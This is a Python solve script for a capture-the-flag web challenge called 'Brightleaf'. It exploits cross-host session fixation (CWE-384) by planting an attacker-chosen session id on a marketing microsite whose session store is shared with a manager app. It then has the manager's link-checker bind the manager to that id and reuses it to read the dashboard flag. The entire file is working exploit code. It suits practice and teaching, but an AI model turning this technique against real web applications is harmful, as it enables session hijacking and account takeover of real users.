#!/usr/bin/env python3
"""
Brightleaf (auth, 150) — CWE-384 cross-host session fixation.

The marketing microsite lets you CHOOSE your own session id (/plant, field `sid`)
and registers it in a session store SHARED with the manager app. The manager
link-checker then signs the manager into any sid you submit. So: pick a sid,
plant it, have the manager bind to it, reuse it on the manager /dashboard.

Usage:
    python3 solve.py                 # defaults below
    python3 solve.py http://auth6.chal.deti:8065 http://marketing.auth6.chal.deti:8065
"""
import re
import sys

import requests

MANAGER = (sys.argv[1] if len(sys.argv) > 1 else "http://auth6.chal.deti:8065").rstrip("/")
MARKETING = (sys.argv[2] if len(sys.argv) > 2 else "http://marketing.auth6.chal.deti:8065").rstrip("/")
SID = "pwn7391"  # we pick it ourselves on the marketing side

FLAG_RE = re.compile(r"flag\{[^}]*\}")


def main() -> int:
    # 1. register our chosen sid on the marketing house (shared session store)
    requests.post(f"{MARKETING}/plant", data={"sid": SID}, timeout=10)
    print(f"[+] planted sid={SID} on marketing")

    # 2. manager link-checker signs the manager into our sid
    r = requests.post(f"{MANAGER}/helpdesk/verify-link", data={"sid": SID}, timeout=10)
    print(f"[i] verify-link: {r.text.strip()!r}")

    # 3. present the sid to the manager host explicitly (host-only cookie, so set by hand)
    r = requests.get(f"{MANAGER}/dashboard", cookies={"sid": SID}, timeout=10)
    m = FLAG_RE.search(r.text)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
        return 0
    print(f"[!] no flag (status {r.status_code}) — body head:\n{r.text[:600]}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
